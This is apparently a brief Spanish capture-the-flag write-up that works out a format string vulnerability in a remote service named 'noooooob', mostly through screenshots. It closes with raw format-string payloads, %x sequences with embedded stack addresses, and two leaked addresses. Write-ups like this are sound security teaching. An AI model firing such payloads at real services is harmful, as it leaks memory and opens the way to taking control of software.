# noooooob

![picture 25](../../images/086bab0cae6e5ff29721d351589531d2fd8f5d2f00f2d420cd45b8620191680c.png)  

Nos conectamos como nos indica. Al intentar listar el pwd, repitio lo que yo escribi, y si preciono enter me saca

![picture 26](../../images/56e1be38235ed1075fc2f7964cedf18a86574c487432056e698d8d8a50e70bee.png)  

Eso, junto con la descripcion del desafio, nos da la pauta de que algo tiene que ver con un buffer. <br>

Entonces, intento mandar un String muy largo. Al hacer esto, el nc me saca directamente (probablemente porque el programa fallo) y me imprime unos caracteres al final

![picture 27](../../images/391545aaaa71d2faabf0b8401c1ab688e921a3bcd0f4d951afc1a49e541e278d.png)  

Para mi sorpresa, intente ver si podia exitir un Format String Vulnerability

![picture 28](../../images/73560e73f07896ec59820a397aa9686c35af57c7b84fe54051bc08ec10cccd7e.png)  

Esto genera un Memory Leak Vulnerability. Puedo hacer un leak del stack.

![picture 30](../../images/0e125e560a959de85474edca14a65bc499a87f0d51efd865cd8c98be3e9386e6.png)  

%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x \xc7\x05\x40\x00\x00\x00\x00\x00 %x %x %x %x %x %x %x %x %x %x %x %x %x %x 

%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x \x48\x10\x60\x00 %x %x %x %x %x %x %x %x %x %x %x %x %x %x 

00000000004005c7
601048